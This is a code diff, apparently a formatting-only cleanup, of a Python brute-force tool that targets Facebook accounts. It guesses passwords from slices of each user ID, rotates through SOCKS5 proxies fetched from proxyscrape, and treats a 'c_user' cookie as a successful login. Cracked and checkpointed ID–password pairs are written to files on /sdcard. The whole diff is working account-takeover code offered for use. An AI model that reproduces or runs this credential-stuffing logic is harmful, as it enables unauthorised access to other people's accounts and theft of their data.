@@ -1000,12 +1000,12 @@ def gxdsFilesMenu(gxdsfiles):
         for data in gxdsfiles:
             uid = data.split("|")[0]
             pxss = []
-            pxss.append(uid[5:])#back 6
-            pxss.append(uid[4:])#back 7
-            pxss.append(uid[3:])#back 8
-            pxss.append(uid[:6])#front 6
-            pxss.append(uid[:7])#front 7
-            pxss.append(uid[:8])#front 8
+            pxss.append(uid[5:])  # back 6
+            pxss.append(uid[4:])  # back 7
+            pxss.append(uid[3:])  # back 8
+            pxss.append(uid[:6])  # front 6
+            pxss.append(uid[:7])  # front 7
+            pxss.append(uid[:8])  # front 8
             nxme = data.split("|")[1]
             name = nxme.lower()
             try:
@@ -1044,14 +1044,17 @@ def gxdsFilesMenu(gxdsfiles):
                 pxss,
             )
 
+
 # PROXIES
 try:
-    proxx = requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
+    proxx = requests.get(
+        "https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all"
+    ).text
 except ProxyError:
     print(" [✓] INTERNET CONNECTION ERROR")
     sys.exit()
-open('.prox.txt','w').write(proxx)
-xprox = open(".prox.txt","r").read().splitlines()
+open(".prox.txt", "w").write(proxx)
+xprox = open(".prox.txt", "r").read().splitlines()
 
 
 # LOOP MENU
@@ -1062,7 +1065,10 @@ cps = []
 # API
 def gxds_files(uid, pxss):
     global oks, loop, cps, xprox
-    sys.stdout.write(f"\r{dg}  [CHECKED] {loop} | [HITS] {str(len(oks))} | [CHECKPOINT] {str(len(cps))} ");sys.stdout.flush()
+    sys.stdout.write(
+        f"\r{dg}  [CHECKED] {loop} | [HITS] {str(len(oks))} | [CHECKPOINT] {str(len(cps))} "
+    )
+    sys.stdout.flush()
     session = requests.Session()
     try:
         for ps in pxss:
@@ -1112,12 +1118,12 @@ def gxds_files(uid, pxss):
             ).text
             lxgin = session.cookies.get_dict().keys()
             if "c_user" in lxgin:
-                print('\r\r\033[1;32m  [GXDS-✓] '+uid+':'+ps+' - '+yxxr(uid))
+                print("\r\r\033[1;32m  [GXDS-✓] " + uid + ":" + ps + " - " + yxxr(uid))
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 oks.append(uid)
                 break
             elif "checkpoint" in lxgin:
-                print('\r\r\033[0;31m  [GXDS-X] '+uid+':'+ps+' - '+yxxr(uid))
+                print("\r\r\033[0;31m  [GXDS-X] " + uid + ":" + ps + " - " + yxxr(uid))
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                 cps.append(uid)
                 break
@@ -1127,6 +1133,7 @@ def gxds_files(uid, pxss):
         loop += 1
     except requests.exceptions.ConnectionError:
         slp(20)
+
 
 # FORWARDER
 def gxdsBot():
